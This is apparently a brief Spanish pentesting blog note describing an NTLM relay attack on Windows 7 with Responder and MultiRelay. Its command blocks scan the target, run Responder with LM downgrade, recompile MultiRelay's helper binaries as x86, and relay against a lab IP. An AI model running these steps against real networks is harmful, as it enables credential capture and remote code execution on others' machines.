---
title: 'Responder Attack'
description: 'Responder Attack'
pubDate: 'May 12 2023'
slug: 'responder_attack'
---

Si esta configurado con Windows 7 Enterprise 7601 Service Pack 1 es propenso a un **responder y multirelay** ataque.

```bash
nmap -A -O target_ip

# setup
responder -I eth1 --lm
ls /usr/share/responder/tools
...
```

El script MultiRelay.py utiliza Runas.exe y Syssvc.exe. Estos ejecutables son x86-64. Necesitamos un ejecutable compilado x86. Eliminemos ambos ejecutables y compilemos un archivo x86. El código fuente de ambos ejecutables está en el directorio /usr/share/responder/tools/MultiRelay/bin.

```bash
rm /usr/share/responder/tools/MultiRelay/bin/Runas.exe
rm /usr/share/responder/tools/MultiRelay/bin/Syssvc.exe

# generar nuevos ejecutables
i686-w64-mingw32-gcc /usr/share/responder/tools/MultiRelay/bin/Runas.c -o /usr/share/responder/tools/MultiRelay/bin/Runas.exe -municode -lwtsapi32 -luserenv

i686-w64-mingw32-gcc /usr/share/responder/tools/MultiRelay/bin/Syssvc.c -o /usr/share/responder/tools/MultiRelay/bin/Syssvc.exe -municode

## luego correr
./MultiRelay.py -t 172.16.5.10 -u ALL

#y el respodner

responder -I eth1 --lm
```
